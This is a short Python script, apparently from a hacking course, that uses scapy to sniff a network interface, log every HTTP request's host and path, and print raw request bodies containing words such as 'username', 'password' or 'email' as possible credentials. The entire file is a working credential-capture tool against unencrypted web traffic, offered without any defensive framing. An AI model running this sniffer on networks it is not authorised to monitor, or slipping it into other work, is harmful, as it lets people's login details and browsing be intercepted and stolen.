import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        host = packet[http.HTTPRequest].Host.decode() if isinstance(packet[http.HTTPRequest].Host, bytes) else packet[http.HTTPRequest].Host
        path = packet[http.HTTPRequest].Path.decode() if isinstance(packet[http.HTTPRequest].Path, bytes) else packet[http.HTTPRequest].Path

        print("[+] Http Request >> " + host + path)
        
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode() if isinstance(packet[scapy.Raw].load, bytes) else packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            
            for key in keys:
                if key in load:
                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                    break

iface = get_interface()
sniff(iface)
